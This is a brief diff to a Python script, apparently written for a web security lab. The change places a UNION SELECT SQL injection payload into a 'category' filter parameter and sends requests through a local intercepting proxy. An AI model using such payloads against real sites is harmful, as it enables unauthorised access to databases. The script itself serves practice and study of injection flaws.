@@ -14,11 +14,11 @@ proxies = {
     'https':'http://127.0.0.1:8080'
 }
 
-payload = "filter?category=Lifestyle'union+select+null,null,null--"
+payload = "'union+select+null,null,null--"
 
 def filter_url():
     global url
-    url = (url.split('.net', 1)[0]) + f'.net/{payload}'
+    url = (url.split('.net', 1)[0]) + f'.net/filter?category=Lifestyle{payload}'
 
 
 filter_url()
